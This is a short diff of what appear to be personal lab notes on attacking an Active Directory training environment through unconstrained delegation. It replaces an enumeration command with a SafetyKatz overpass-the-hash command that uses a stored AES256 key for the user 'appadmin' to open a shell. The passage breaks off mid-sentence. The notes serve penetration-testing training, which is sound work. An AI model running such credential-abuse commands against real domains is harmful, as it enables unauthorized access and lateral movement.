@@ -611,6 +611,7 @@ Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ![[Pasted image 20231025161708.png]]
 Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. We already pwned on of those user (appadmin)
 We can try with the user already found gain a session on this server
-```power
-Get-DomainComputer -Unconstrained | select -ExpandProperty name
+```powershell
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
 ```
+One we are 
